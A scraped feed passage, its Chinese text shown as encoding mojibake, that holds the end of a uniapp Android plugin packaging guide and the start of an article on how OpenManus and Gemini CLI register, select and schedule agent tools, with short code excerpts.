<h2 data-id="heading-15">æ‰“åŒ…æ’ä»¶åˆ°uniappé¡¹ç›®ä¸­ä½¿ç”¨</h2>
<p>å®‰å“æ‰“åŒ…æ’ä»¶</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f33b0d43b33446528e2be2b42ded5df1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=yVLY2ZGIpxekqwOnmrvzcQj5L0U%3D" alt="image.png" loading="lazy"/></p>
<p>æ‹·è´æ‰“åŒ…å‡ºçš„æ’ä»¶</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1587b6e7d9884eb8a7b9931c0fce2640~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=J419eZdJmoqofQiyUbXVeEAdBAA%3D" alt="image.png" loading="lazy"/></p>
<p>æ”¾åˆ°uniappé¡¹ç›®çš„nativepluginsç›®å½•ä¸‹å¯¹åº”çš„æ’ä»¶æ–‡ä»¶å¤¹ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªandroidçš„æ–‡ä»¶å¤¹ï¼ŒæŠŠæ‹·è´çš„æ’ä»¶åŒ…æ”¾è¿›å»</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa2f6c55ad9344b295de19f69444d718~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=dXsSjTAvbGmjp5YkJ8xo8AYLyDs%3D" alt="image.png" loading="lazy"/></p>
<p>ç„¶åè¿è¡Œ<strong>è‡ªå®šä¹‰åŸºåº§</strong>æˆ–è€…ç›´æ¥æ‰“åŒ…å°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ï¼Œ<strong>uniappæ ‡å‡†åŸºåº§æ˜¯ä¸æ”¯æŒè‡ªå®šä¹‰æ’ä»¶çš„</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Agent æ ¸å¿ƒç®¡ç†é€»è¾‘ï¼šå·¥å…·çš„ç®¡ç†å’Œè°ƒåº¦]]></title>    <link>https://juejin.cn/post/7589201772133810217</link>    <guid>https://juejin.cn/post/7589201772133810217</guid>    <pubDate>2025-12-30T04:52:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772133810217" data-draft-id="7589246131585908771" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Agent æ ¸å¿ƒç®¡ç†é€»è¾‘ï¼šå·¥å…·çš„ç®¡ç†å’Œè°ƒåº¦"/> <meta itemprop="keywords" content="Agent"/> <meta itemprop="datePublished" content="2025-12-30T04:52:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ½˜é”¦"/> <meta itemprop="url" content="https://juejin.cn/user/730549110707431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Agent æ ¸å¿ƒç®¡ç†é€»è¾‘ï¼šå·¥å…·çš„ç®¡ç†å’Œè°ƒåº¦
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/730549110707431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ½˜é”¦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T04:52:16.000Z" title="Tue Dec 30 2025 04:52:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç®€å•æ¥è¯´ï¼ŒAI Agent å°±æ˜¯ä¸€ä¸ªèƒ½å¤Ÿè‡ªä¸»æ„ŸçŸ¥ç¯å¢ƒã€åˆ¶å®šè®¡åˆ’ã€é‡‡å–è¡ŒåŠ¨æ¥å®Œæˆç‰¹å®šç›®æ ‡çš„ç³»ç»Ÿã€‚</p>
<p>ä»æ¶æ„çš„è§’åº¦æ¥çœ‹ï¼Œåˆå¯ä»¥åˆ†ä¸ºæ„ŸçŸ¥æ¨¡å—ï¼ˆåŒ…æ‹¬çŠ¶æ€ä¸Šä¸‹æ–‡å’Œæ„å›¾ä¸Šä¸‹æ–‡ï¼Œè€Œæ„å›¾ä¸Šä¸‹æ–‡æ˜¯ä¸€ä¸ªæ›´éš¾ä¸€äº›çš„é—®é¢˜ï¼‰ï¼Œæ¨ç†æ¨¡å—ï¼ˆLLM ä¸»æ§éƒ¨åˆ†ï¼‰ï¼Œè®°å¿†æ¨¡å—ï¼Œè¡ŒåŠ¨æ¨¡å—ã€‚</p>
<p>ä»Šå¤©æˆ‘ä»¬è¦èŠçš„æ˜¯è´¯ç©¿äºå„ä¸ªæ¨¡å—ä¸­çš„å·¥å…·ï¼Œå·¥å…·ä¸ä»…ä»…æ˜¯è¡ŒåŠ¨æ¨¡å—ï¼Œåœ¨æ„ŸçŸ¥ï¼Œè®°å¿†ä¸­éƒ½æœ‰å¯èƒ½ç”¨åˆ°å·¥å…·ã€‚</p>
<h2 data-id="heading-0">1. OpenManus çš„å·¥å…·ç®¡ç†å’Œè°ƒåº¦</h2>
<p>çœ‹äº† OpenManus çš„ä»£ç ï¼Œæ•´ä¸ªå·¥ç¨‹ä¸­ Tool çš„å æ¯”è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œè¿™ä¹Ÿä¸æ˜¯ä¸€ä¸ªå¤§è€Œå…¨çš„æ¡†æ¶ã€‚</p>
<p>ç›´æ¥çœ‹ä»£ç </p>
<h3 data-id="heading-1">1.1 BaseTool åŸºç¡€ç±»</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseTool</span>(<span class="hljs-title class_ inherited__">ABC</span>):
    name: <span class="hljs-built_in">str</span>
    description: <span class="hljs-built_in">str</span>  
    parameters: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]
    
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">self, tool_input: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]</span>) -&gt; ToolResult
</code></pre>
<p>name ç”¨äºæ ‡è¯†ï¼Œdescription ç»™ LLM çœ‹ï¼Œparameters å®šä¹‰è¾“å…¥è§„èŒƒï¼Œexecute æ‰§è¡Œå…·ä½“é€»è¾‘ã€‚è¿™å‡ ä¸ªå­—æ®µï¼Œå·²ç»æ¶µç›–äº†å·¥å…·ç®¡ç†çš„æ ¸å¿ƒè¦ç´ ã€‚</p>
<h3 data-id="heading-2">1.2 ToolCollection ç®¡ç†å™¨</h3>
<p>å·¥å…·é›†åˆçš„ç®¡ç†é€šè¿‡ ToolCollection ç±»å®ç°ï¼Œæ ¸å¿ƒæ˜¯ä¸€ä¸ªå­—å…¸ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolCollection</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.tool_map: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, BaseTool] = {}
</code></pre>
<p>æ•´ä¸ªå®ç°æœ‰ä»¥ä¸‹ä¸‰ä¸ªå°ç‚¹ï¼š</p>
<ul>
<li><strong>O(1) çš„æŸ¥æ‰¾æ€§èƒ½</strong>ã€‚ç”¨å·¥å…·åä½œä¸º keyï¼Œç›´æ¥æŸ¥æ‰¾ï¼Œæ²¡æœ‰éå†ï¼Œæ²¡æœ‰å¤æ‚çš„åŒ¹é…é€»è¾‘ã€‚</li>
<li><strong>ç»Ÿä¸€çš„æ‰§è¡Œæ¥å£</strong>ã€‚æ‰€æœ‰å·¥å…·è°ƒç”¨éƒ½é€šè¿‡ <code>execute</code> æ–¹æ³•ï¼Œä¼ å…¥å·¥å…·åå’Œå‚æ•°ï¼Œè¿”å›ç»Ÿä¸€çš„ ToolResultã€‚è¿™ç§ä¸€è‡´æ€§è®©ä¸Šå±‚è°ƒç”¨å˜å¾—æå…¶ç®€å•ã€‚</li>
<li><strong>ç»Ÿä¸€çš„é”™è¯¯å¤„ç†</strong>ã€‚å·¥å…·ä¸å­˜åœ¨ã€æ‰§è¡Œå¤±è´¥éƒ½ä¼šè¿”å› ToolFailureï¼Œä¸ä¼šæŠ›å¼‚å¸¸æ‰“æ–­æµç¨‹ã€‚è¿™ç§è®¾è®¡è®©ç³»ç»Ÿæ›´å¥å£®ã€‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_tool</span>(<span class="hljs-params">self, tool: BaseTool</span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">if</span> tool.name <span class="hljs-keyword">in</span> self.tool_map:
        logger.warning(<span class="hljs-string">f"Tool <span class="hljs-subst">{tool.name}</span> already exists, overwriting"</span>)
    self.tool_map[tool.name] = tool
</code></pre>
<p>åœ¨æ·»åŠ å·¥å…·æ—¶å¯ä»¥è¦†ç›–å·²æœ‰å·¥å…·ã€‚</p>
<h3 data-id="heading-3">1.3 Think-Act å¾ªç¯</h3>
<p>OpenManus å®ç°äº†æ ‡å‡†çš„ ReActï¼ˆReasoning and Actingï¼‰æ¨¡å¼ï¼Œä½†åšäº†å¾ˆå¤šç»†èŠ‚ä¼˜åŒ–ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">await</span> self.think()  <span class="hljs-comment"># æ€è€ƒï¼šå†³å®šç”¨ä»€ä¹ˆå·¥å…·</span>
    <span class="hljs-keyword">await</span> self.act()    <span class="hljs-comment"># è¡ŒåŠ¨ï¼šæ‰§è¡Œå·¥å…·è°ƒç”¨</span>
</code></pre>
<p>è¿™ä¸ªå®ç°æ˜¯åœ¨ ReActAgent ä¸­å®šä¹‰çš„ï¼Œthink é˜¶æ®µè®© LLM åˆ†æå½“å‰çŠ¶æ€å¹¶é€‰æ‹©å·¥å…·ï¼Œact é˜¶æ®µæ‰§è¡Œå·¥å…·å¹¶æ”¶é›†ç»“æœã€‚ä¸¤ä¸ªé˜¶æ®µåˆ†ç¦»ï¼Œè®©æ•´ä¸ªæµç¨‹å¯æ§ã€å¯è°ƒè¯•ã€‚</p>
<h3 data-id="heading-4">1.4 å·¥å…·é€‰æ‹©</h3>
<p>å·¥å…·é€‰æ‹©æ˜¯æ•´ä¸ªç³»ç»Ÿçš„æ ¸å¿ƒï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">think</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
    response = <span class="hljs-keyword">await</span> self.llm.ask_tool(
        messages=self.memory.get_messages(),
        system_prompts=self.system_prompts,
        available_tools=self.available_tools.get_tool_schemas(),
        tool_choices=self.tool_choices
    )
</code></pre>
<p>å®ƒæŠŠå‡ ä¸ªå…³é”®ä¿¡æ¯éƒ½ä¼ ç»™ LLMï¼š</p>
<ul>
<li><strong>å†å²å¯¹è¯</strong>ï¼ˆmessagesï¼‰ï¼šè®© LLM äº†è§£ä¸Šä¸‹æ–‡</li>
<li><strong>ç³»ç»Ÿæç¤º</strong>ï¼ˆsystem_promptsï¼‰ï¼šå®šä¹‰ Agent çš„è¡Œä¸ºè§„èŒƒ</li>
<li><strong>å¯ç”¨å·¥å…·</strong>ï¼ˆavailable_toolsï¼‰ï¼šå‘Šè¯‰ LLM æœ‰å“ªäº›å·¥å…·å¯ç”¨</li>
<li><strong>é€‰æ‹©æ¨¡å¼</strong>ï¼ˆtool_choicesï¼‰ï¼šæ§åˆ¶æ˜¯å¦å¿…é¡»é€‰æ‹©å·¥å…·</li>
</ul>
<p>è¿™ç§è®¾è®¡è®©å·¥å…·é€‰æ‹©æ—¢çµæ´»åˆå¯æ§ã€‚</p>
<h3 data-id="heading-5">1.5 æ‰¹é‡æ‰§è¡Œå’Œç»“æœå¤„ç†</h3>
<p>OpenManus æ”¯æŒä¸€æ¬¡é€‰æ‹©å¤šä¸ªå·¥å…·å¹¶è¡Œæ‰§è¡Œï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">act</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">if</span> self.tool_calls:
        <span class="hljs-keyword">for</span> tool_call <span class="hljs-keyword">in</span> self.tool_calls:
            observation = <span class="hljs-keyword">await</span> self.execute_tool(tool_call)
            self.memory.add_message(ToolMessage(observation, tool_call.<span class="hljs-built_in">id</span>))
</code></pre>
<p>æ¯ä¸ªå·¥å…·çš„æ‰§è¡Œç»“æœéƒ½ä¼šè®°å½•åˆ° memory ä¸­ï¼Œä¾›ä¸‹ä¸€è½®æ€è€ƒä½¿ç”¨ã€‚</p>
<h3 data-id="heading-6">1.6 ç‰¹æ®Šå·¥å…·å¤„ç†</h3>
<p>OpenManus é¢„ç•™äº†ç‰¹æ®Šå·¥å…·çš„å¤„ç†æœºåˆ¶ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_special_tool</span>(<span class="hljs-params">self, tool_call: ToolCall</span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">if</span> tool_call.name == <span class="hljs-string">"Terminate"</span>:
        self.should_stop = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Task completed successfully."</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"Unknown special tool: <span class="hljs-subst">{tool_call.name}</span>"</span>
</code></pre>
<p>Terminate å·¥å…·ç”¨äºä¼˜é›…ç»ˆæ­¢ï¼Œè¿™ç§è®¾è®¡é¿å…äº†ç¡¬ç¼–ç çš„é€€å‡ºé€»è¾‘ã€‚ä½ å¯ä»¥è½»æ¾æ·»åŠ å…¶ä»–ç‰¹æ®Šå·¥å…·ï¼Œæ¯”å¦‚ Pauseï¼ˆæš‚åœï¼‰ã€Checkpointï¼ˆä¿å­˜çŠ¶æ€ï¼‰ç­‰ã€‚</p>
<h2 data-id="heading-7">2. Gemini CLI çš„å·¥å…·ç®¡ç†å’Œè°ƒåº¦</h2>
<p><strong>Gemini CLI æŠŠæ‰€æœ‰å·¥å…·éƒ½æ‰”ç»™å¤§æ¨¡å‹ï¼Œè®©å®ƒè‡ªå·±é€‰</strong>ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å°±è¿™ä¹ˆç®€å•ï¼Œæ‰€æœ‰å·¥å…·ä¸€è‚¡è„‘ç»™ LLM</span>
<span class="hljs-keyword">async</span> <span class="hljs-title function_">setTools</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
  <span class="hljs-keyword">const</span> toolRegistry = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-title function_">getToolRegistry</span>();
  <span class="hljs-keyword">const</span> toolDeclarations = toolRegistry.<span class="hljs-title function_">getFunctionDeclarations</span>();
  <span class="hljs-keyword">const</span> <span class="hljs-attr">tools</span>: <span class="hljs-title class_">Tool</span>[] = [{ <span class="hljs-attr">functionDeclarations</span>: toolDeclarations }];
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getChat</span>().<span class="hljs-title function_">setTools</span>(tools);
}
</code></pre>
<p>ç°åœ¨çš„å¤§æ¨¡å‹å·²ç»è¶³å¤Ÿèªæ˜ï¼Œèƒ½å¤Ÿæ ¹æ®ä¸Šä¸‹æ–‡é€‰æ‹©åˆé€‚çš„å·¥å…·ã€‚ä¸å…¶èŠ±å¤§åŠ›æ°”è®¾è®¡å¤æ‚çš„å·¥å…·é€‰æ‹©ç­–ç•¥ï¼Œä¸å¦‚ç›¸ä¿¡ AI çš„åˆ¤æ–­åŠ›ã€‚ä½†ä¼šæœ‰å¯èƒ½å­˜åœ¨å·¥å…·ã€Œçˆ†ç‚¸ã€çš„æƒ…å†µï¼Œè¿™ä¸ªåé¢æˆ‘ä»¬å†èŠã€‚</p>
<h3 data-id="heading-8">2.1 ä¸‰å±‚å·¥å…·å‘ç°æœºåˆ¶</h3>
<p>Gemini CLI åœ¨å·¥å…·å‘ç°æ–¹é¢è®¾è®¡äº†ä¸‰å±‚æœºåˆ¶ï¼š</p>
<h4 data-id="heading-9">1. å†…ç½®æ ¸å¿ƒå·¥å…·</h4>
<p>è¿™äº›æ˜¯ç²¾å¿ƒæŒ‘é€‰çš„å¸¸ç”¨å·¥å…·ï¼Œè¦†ç›–äº†å¤§éƒ¨åˆ†æ—¥å¸¸å¼€å‘éœ€æ±‚ï¼š</p>
<ul>
<li><strong>æ–‡ä»¶æ“ä½œ</strong>ï¼šlsã€read-fileã€write-fileã€edit</li>
<li><strong>ä»£ç æœç´¢</strong>ï¼šgrepã€ripgrepã€glob</li>
<li><strong>ç³»ç»Ÿäº¤äº’</strong>ï¼šshell</li>
<li><strong>ç½‘ç»œè¯·æ±‚</strong>ï¼šweb-fetchã€web-search</li>
<li><strong>è®°å¿†ç®¡ç†</strong>ï¼šmemory</li>
</ul>
<p>æ¯ä¸ªå·¥å…·éƒ½ç»è¿‡ç²¾å¿ƒè®¾è®¡ï¼Œæ¥å£æ¸…æ™°ï¼ŒåŠŸèƒ½ä¸“ä¸€ã€‚æ¯”å¦‚ edit å·¥å…·ï¼Œä¸ä»…èƒ½ç¼–è¾‘æ–‡ä»¶ï¼Œè¿˜æ”¯æŒé¢„è§ˆä¿®æ”¹ã€‚</p>
<h4 data-id="heading-10">2. å‘½ä»¤è¡Œå·¥å…·å‘ç°</h4>
<p>è¿™æ˜¯ä¸ªå¾ˆå·§å¦™çš„è®¾è®¡ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®ä¸€ä¸ªå‘ç°å‘½ä»¤ï¼Œè®©ç³»ç»Ÿè‡ªåŠ¨å‘ç°å’Œæ³¨å†Œæ–°å·¥å…·ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ‰§è¡Œå‘ç°å‘½ä»¤ï¼Œè§£æè¿”å›çš„å·¥å…·å£°æ˜</span>
<span class="hljs-keyword">async</span> <span class="hljs-title function_">discoverAndRegisterToolsFromCommand</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
  <span class="hljs-keyword">const</span> command = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-title function_">getConfigOptions</span>().<span class="hljs-property">toolDiscoveryCommand</span>;
  <span class="hljs-keyword">if</span> (!command) <span class="hljs-keyword">return</span>;
  
  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">exec</span>(command);
  <span class="hljs-keyword">const</span> functions = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(result.<span class="hljs-property">stdout</span>);
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> func <span class="hljs-keyword">of</span> functions) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">registerTool</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DiscoveredTool</span>(func));
  }
}
</code></pre>
<p>è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è½»æ¾æ‰©å±•å·¥å…·é›†ï¼Œåªè¦æˆ‘ä»¬çš„å·¥å…·èƒ½è¾“å‡ºç¬¦åˆæ ¼å¼çš„ JSON å£°æ˜å³å¯ã€‚</p>
<h4 data-id="heading-11">3. MCP æœåŠ¡å™¨é›†æˆ</h4>
<p>MCPï¼ˆModel Context Protocolï¼‰æ˜¯ä¸ªé€šç”¨çš„åè®®ï¼ŒGemini CLI å¯¹å®ƒçš„æ”¯æŒç›¸å½“å®Œå–„ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ”¯æŒå¤šç§ä¼ è¾“åè®®</span>
- stdioï¼šæ ‡å‡†è¾“å…¥è¾“å‡º
- <span class="hljs-variable constant_">SSE</span>ï¼šæœåŠ¡å™¨æ¨é€äº‹ä»¶
- <span class="hljs-variable constant_">HTTP</span>ï¼š<span class="hljs-variable constant_">REST</span> <span class="hljs-variable constant_">API</span>
- <span class="hljs-title class_">WebSocket</span>ï¼šåŒå‘é€šä¿¡
</code></pre>
<p>é€šè¿‡ MCPï¼Œæˆ‘ä»¬å¯ä»¥æ¥å…¥å„ç§ä¸“ä¸šå·¥å…·æœåŠ¡å™¨ï¼Œæ¯”å¦‚æ•°æ®åº“æŸ¥è¯¢ã€API è°ƒç”¨ã€ä¸“ä¸šé¢†åŸŸå·¥å…·ç­‰ã€‚æ¯ä¸ª MCP æœåŠ¡å™¨çš„å·¥å…·éƒ½æ˜¯éš”ç¦»çš„ï¼Œé¿å…äº†å‘½åå†²çªã€‚</p>
<h3 data-id="heading-12">2.2 å·¥å…·è°ƒåº¦å™¨</h3>
<p>Gemini CLI çš„å·¥å…·è°ƒåº¦å™¨é‡‡ç”¨äº†æ¸…æ™°çš„çŠ¶æ€æœºæ¨¡å‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å·¥å…·æ‰§è¡ŒçŠ¶æ€æµè½¬</span>
validating â†’ scheduled â†’ awaiting_approval â†’ executing â†’ success/error/cancelled
</code></pre>
<p>åœ¨æ‰§è¡Œå‰å…ˆéªŒè¯å‚æ•°ï¼Œé¿å…æ— æ•ˆè°ƒç”¨ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">ValidatingToolCall</span> = {
  <span class="hljs-attr">status</span>: <span class="hljs-string">'validating'</span>;
  <span class="hljs-attr">request</span>: <span class="hljs-title class_">ToolCallRequestInfo</span>;
  <span class="hljs-attr">tool</span>: <span class="hljs-title class_">AnyDeclarativeTool</span>;
  <span class="hljs-attr">invocation</span>: <span class="hljs-title class_">AnyToolInvocation</span>;
};
</code></pre>
<p>æ ¹æ®å·¥å…·é£é™©ç­‰çº§ï¼Œæä¾›ä¸åŒçš„ç¡®è®¤ç­–ç•¥ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸‰ç§ç¡®è®¤æ¨¡å¼</span>
<span class="hljs-title class_">ApprovalMode</span>.<span class="hljs-property">DEFAULT</span>    <span class="hljs-comment">// æ ‡å‡†ç¡®è®¤</span>
<span class="hljs-title class_">ApprovalMode</span>.<span class="hljs-property">AUTO_EDIT</span>  <span class="hljs-comment">// è‡ªåŠ¨ç¼–è¾‘ç¡®è®¤</span>
<span class="hljs-title class_">ApprovalMode</span>.<span class="hljs-property">YOLO</span>       <span class="hljs-comment">// æ— ç¡®è®¤æ¨¡å¼ï¼ˆå‹‡è€…æ¨¡å¼ï¼‰</span>
